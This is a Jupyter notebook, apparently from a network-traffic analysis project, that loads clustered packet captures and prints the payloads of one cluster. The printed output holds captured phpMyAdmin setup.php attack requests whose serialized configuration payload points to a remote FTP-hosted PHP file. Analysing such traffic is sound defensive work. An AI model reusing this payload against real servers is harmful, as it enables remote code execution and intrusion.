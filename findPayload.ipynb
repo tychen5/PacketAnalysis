{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle as pk\n",
    "%run TcpPayloadConverter.ipynb\n",
    "%run Cluster.ipynb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "isp = \"台灣之星\"\n",
    "with open(\"./pickle/\"+ isp + \"_clusters_correlateIP_0.9.pkl\", \"rb\")as file:\n",
    "    tmp = pk.load(file)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def findPayload(payload, target):\n",
    "    for i in range(len(payload)):\n",
    "        cid = payload[i].id\n",
    "        if cid == target:\n",
    "            print(payload[i].clusterPayload)\n",
    "            break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[[b'POST /phpmyadmin/scripts/setup.php/index.php HTTP/1.1  Keep-Alive: 300  Connection: Keep-Alive  Host: 43.255.90.27  Referer: http://43.255.90.27/phpmyadmin/scripts/setup.php/index.php  User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]  Content-Type: application/x-www-form-urlencoded  Content-Length: 207    action=lay_navigation&eoltype=unix&token=&configuration=a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22PMA%5FConfig%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A30%3A%22ftp%3A%2F%2F45%2E32%2E222%2E87%2Fpub%2FFTP%2Ephp%22%3B%7D%7D', b'POST /phpmyadmin/scripts/setup.php/index.php HTTP/1.1  Keep-Alive: 300  Connection: Keep-Alive  Host: 43.255.90.27  Referer: http://43.255.90.27/phpmyadmin/scripts/setup.php/index.php  User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]  Content-Type: application/x-www-form-urlencoded  Content-Length: 207    action=lay_navigation&eoltype=unix&token=&configuration=a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22PMA%5FConfig%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A30%3A%22ftp%3A%2F%2F45%2E32%2E222%2E87%2Fpub%2FFTP%2Ephp%22%3B%7D%7D', b'POST /phpmyadmin/scripts/setup.php/index.php HTTP/1.1  Keep-Alive: 300  Connection: Keep-Alive  Host: 43.255.90.27  Referer: http://43.255.90.27/phpmyadmin/scripts/setup.php/index.php  User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]  Content-Type: application/x-www-form-urlencoded  Content-Length: 207    action=lay_navigation&eoltype=unix&token=&configuration=a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22PMA%5FConfig%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A30%3A%22ftp%3A%2F%2F45%2E32%2E222%2E87%2Fpub%2FFTP%2Ephp%22%3B%7D%7D', b'HTTP/1.1 404 Not Found  Server: Apache/1.3.29 (Unix) PHP/4.3.4  Content-Length: 292  Content-Language: de  Content-Type: text/html  Connection: close    <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">  <html><head>  <title>400 Bad Request</title>  </head><body>  <h1>Bad Request</h1>  <p>Your browser sent a request that this server could not understand.<br />  </p>  <hr>  <address>Apache/1.3.29 Server at Port 80</address>  </body></html>    ']]\n"
     ]
    }
   ],
   "source": [
    "findPayload(tmp, \"20200106_5372_http\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
